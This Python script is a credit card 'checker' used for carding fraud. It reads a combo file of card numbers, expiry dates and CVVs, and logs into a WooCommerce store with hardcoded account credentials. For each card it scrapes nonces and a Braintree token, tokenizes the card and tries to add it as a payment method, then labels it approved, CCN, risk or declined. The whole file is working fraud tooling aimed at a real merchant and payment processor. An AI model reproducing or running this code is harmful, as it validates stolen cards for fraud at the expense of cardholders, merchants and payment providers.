import requests
import re
import base64
import random
import time

def chk(card):
    try:
        import requests, re, base64, random, string, user_agent, time
        from requests_toolbelt.multipart.encoder import MultipartEncoder
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

        card = card.strip()
        parts = re.split('[|/:]', card)
        if len(parts) < 4:
            return "ERROR: invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        r = requests.session()
        headers_base = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0 Safari/537.36"
        }

        acc = ['f0f17b7d14@webxios.pro', '1f88e5b610@webxios.pro']
        email = random.choice(acc)

        response = r.get('https://www.studynotesaba.com/my-account/', headers=headers_base)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not m:
            return "ERROR: login nonce not found"
        login = m.group(1)

        data = {
            'username': email,
            'password': 'Baphomet123@@',
            'woocommerce-login-nonce': login,
            '_wp_http_referer': '/my-account/',
            'login': 'Login',
        }
        r.post('https://www.studynotesaba.com/my-account/', data=data, headers=headers_base)

        response = r.get('https://www.studynotesaba.com/my-account/add-payment-method/', headers=headers_base)
        m = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
        if not m:
            return "ERROR: client token not found"
        enc = m.group(1)

        try:
            dec = base64.b64decode(enc).decode('utf-8')
        except Exception:
            return "ERROR: failed to decode token"

        m = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
        if not m:
            return "ERROR: fingerprint not found"
        au = m[0]

        m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not m:
            return "ERROR: add-payment-method nonce not found"
        add_nonce = m.group(1)

        headers = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'bb76580e-50ec-49e3-a8dd-c431314d96fa'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { last4 } } }',
            'variables': {'input': {'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}}}
        }
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        try:
            tok = response.json()['data']['tokenizeCreditCard']['token']
        except Exception:
            return "ERROR: failed to tokenize card"

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        response = r.post('https://www.studynotesaba.com/my-account/add-payment-method/', data=data, headers=headers_base)
        text = response.text

        pattern = r'Reason: (.*?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1).strip()
            if 'risk_threshold' in text:
                result = "RISK: Retry this BIN later."
        else:
            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
                result = "1000: Approved"
            else:
                result = "Declined"

        return result
    except Exception as e:
        return f"ERROR: {str(e)}"


def run_combo(file_name):
    results = []
    try:
        with open(f'{file_name}.txt', "r") as file:
            for card in file.readlines():
                card = card.strip()
                result = chk(card)

                if result == "1000: Approved":
                    status = "Approved ✅"
                elif result == "Card Issuer Declined CVV":
                    status = "CCN ✅"
                elif "RISK" in result:
                    status = "Risk ❌"
                elif "ERROR" in result:
                    status = "Error ❌"
                else:
                    status = "Declined ❌"

                results.append(f"{card} | {result} | {status}")
                time.sleep(5)

        return "\n".join(results)
    except Exception as e:
        return f"ERROR reading combo file: {str(e)}"


def Tele(card):
    return chk(card)


def sq(card):
    return chk(card)
